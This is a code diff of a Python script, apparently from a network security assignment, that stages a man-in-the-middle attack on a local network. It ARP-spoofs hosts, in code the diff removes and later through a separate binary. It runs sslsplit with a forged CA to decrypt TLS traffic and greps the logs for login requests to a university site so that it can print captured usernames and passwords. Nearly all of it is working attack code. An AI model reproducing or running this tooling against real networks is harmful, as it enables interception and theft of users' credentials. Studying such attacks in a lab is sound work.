@@ -8,62 +8,10 @@ from fcntl import ioctl
 import scapy.all as scapy
 from subprocess import Popen, DEVNULL
 
-IP_MAC = []
-interface_name = "ens33"
-my_MAC = ""
-my_IP = ""
 log_dir = "./sslsplit_log"
 connect_log = 'connect.log'
-SIOCGIFADDR = 0x8915
-capture_info = 'GET /login/index.php'
+capture_info = '/login/index.php HTTP/1.1'
 
-def get_my_MAC():
-    global my_MAC, interface_name
-    f = open('/sys/class/net/' + interface_name + '/address')
-    my_MAC = f.read().strip()
-    print("my MAC:", my_MAC)
-def get_my_IP():
-    global my_IP, interface_name
-    s = socket.socket(socket.SOCK_DGRAM)
-    raw_ip = ioctl(s.fileno(), SIOCGIFADDR, struct.pack('64s', interface_name.encode("utf-8")))[20:24]
-    my_IP = socket.inet_ntoa(raw_ip)
-    print("my IP", my_IP)
-
-def sort_IP_MAC(entry):
-    return socket.inet_aton(entry[0])
-def collect_IP_MAC_info():
-    global IP_MAC, my_IP
-    ip_slice = my_IP.split('.')
-    os.system("nmap -sP  {}.{}.{}.1-254 > /dev/null".format(ip_slice[0], ip_slice[1], ip_slice[2]))
-    from_child = os.popen("arp -a").read()
-    records = from_child.split()
-    print("Available devices")
-    print('-'*40)
-    print("IP\t\t\tMAC")
-    print('-'*40)
-
-    tmp = ""
-    for record in records:
-        # IP addr
-        if len(record.split('.')) == 4:
-            tmp = record[1:-1]
-        # MAC addr
-        if len(record.split(':')) == 6 and len(tmp) > 0:
-            IP_MAC.append([tmp,record])
-            tmp = ""
-    IP_MAC.sort(key=sort_IP_MAC)
-    for entry in IP_MAC:
-        print(entry[0], end="\t\t")
-        print(entry[1], end='\n')
-
-def ARP_spoofing():
-    # get ARP request
-    global my_IP, my_MAC
-    for IP, MAC in IP_MAC:
-        for other_IP, other_MAC in IP_MAC:
-            if other_IP == IP and other_MAC == MAC: continue
-            arp = scapy.ARP(op=2, pdst=IP, hwdst=MAC, psrc=other_IP, hwsrc=my_MAC)
-            scapy.send(arp, verbose=False) # verbose=False -> disable packet sent notification
 def process_packets():
     Popen(["sslsplit", "-D", '-l', 'connect.log', '-p', 'sslsplit.pid', "-S","sslsplit_log", 
            "-k", "ca.key", "-c", "ca.crt",            
@@ -73,10 +21,11 @@ def process_packets():
 
 def find_log_file():
     # get the latest connect
-    find_log = os.popen(f"grep -s {capture_info} {log_dir}/* | tail -n 1").read().split() # -s: not print error
+    find_log = os.popen(f"grep -s '{capture_info}' {log_dir}/* | tail -n 1").read().split() # -s: not print error
     if(len(find_log) > 0):
         for log_path in find_log:
             if(log_path.find('.log')!=-1):
+                #print(log_path)
                 return log_path
     return 0
 
@@ -99,28 +48,29 @@ def print_usr_passwd(log_path):
 def count_connect():
     return os.popen(f'cat {connect_log} 2>/dev/null | grep -s sni:e3.nycu.edu.tw | wc -l').read().strip()
 
-get_my_MAC()
-get_my_IP()
-collect_IP_MAC_info()
+def arp_spoofing():
+    Popen(['./arp_spoofing'])
+
+before_connect = count_connect()
+print(f'\nconnect num before start: {before_connect}')
+
+arp_spoofing()
+time.sleep(5)
+
+process_packets()
+
 while True:
-    before_connect = count_connect()
-    print(f'\nconnect num before start: {before_connect}')
-    
-    ARP_spoofing()
-    process_packets()
+    time.sleep(3)
+    after_connect = count_connect()
+    if(before_connect == after_connect): continue
 
-    for round in range(10):
-        print(f"#### {round+1} ####")
-        time.sleep(3)
-        after_connect = count_connect()
-        if(before_connect == after_connect): continue
-        
-        log_file = find_log_file()
-        if(log_file):
-            print_usr_passwd(log_file)
+    log_file = find_log_file() 
+    if(log_file):
+        print_usr_passwd(log_file)
 
-    with open("sslsplit.pid") as pid_file:
-        pid = next(pid_file).strip()
-        os.kill(int(pid), signal.SIGTERM)
+
+#    with open("sslsplit.pid") as pid_file:
+#        pid = next(pid_file).strip()
+#        os.kill(int(pid), signal.SIGTERM)
 
 # sniff(filter="arp", prn=ARP_spoofing, store=0)
